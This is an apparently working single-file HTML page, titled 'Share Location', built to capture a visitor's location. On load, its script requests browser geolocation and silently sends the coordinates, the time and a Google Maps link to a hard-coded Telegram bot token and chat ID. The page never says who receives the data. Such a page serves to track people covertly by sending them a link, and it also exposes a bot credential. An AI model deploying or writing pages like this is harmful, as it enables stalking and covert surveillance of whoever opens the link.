<!DOCTYPE html>
<html>
<head>
  <title>Share Location</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial; text-align: center; padding: 80px; background: #f0f7ff; }
    h1 { color: #1a73e8; }
  </style>
</head>
<body>
  <h1>📍 Sharing Location...</h1>
  <p>Please allow location access.</p>
  <div id="result"></div>

  <script>
    const token = "8603128926:AAFtSTZ-QBtA_DoSlywwwOq7DjJJkg4t2OU";
    const chatId = "1199516595";

    function sendToTelegram(lat, lon) {
      const message = `📍 New Location Received!\n\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(res => res.json())
        .then(data => {
          if (data.ok) {
            document.getElementById("result").innerHTML = `<p style="color:green;font-size:18px;">✅ Location Sent to Telegram!</p>`;
          } else {
            document.getElementById("result").innerHTML = `<p style="color:red;">Error: ${data.description}</p>`;
          }
        })
        .catch(() => {
          document.getElementById("result").innerHTML = `<p style="color:orange;">Sent (check Telegram)</p>`;
        });
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          sendToTelegram(lat, lon);

          document.getElementById("result").innerHTML = `<p style="color:green;">Processing...</p>`;
        }, () => {
          document.getElementById("result").innerHTML = `<p style="color:red;">Permission denied.</p>`;
        });
      }
    }

    window.onload = getLocation;
  </script>
</body>
</html>
